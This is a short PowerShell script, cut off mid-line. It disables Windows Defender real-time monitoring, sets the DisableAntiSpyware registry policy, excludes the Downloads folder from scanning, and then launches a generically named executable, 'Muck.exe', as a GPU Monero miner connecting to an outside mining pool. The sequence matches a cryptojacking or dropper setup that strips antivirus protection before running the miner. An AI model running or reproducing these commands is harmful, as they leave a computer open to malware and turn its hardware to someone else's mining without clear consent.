Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath $ENV:USERPROFILE\Downloads
Muck.exe --no-cpu --cuda --opencl --donate-level=1 --retries=3 -o stratum+tcp://us.mining.prohashing.com:3359 --coin=monero -u salad -p o=12db4913-1108-4138-adb9-5418f00576f6,n=12db4913-1108-4138-

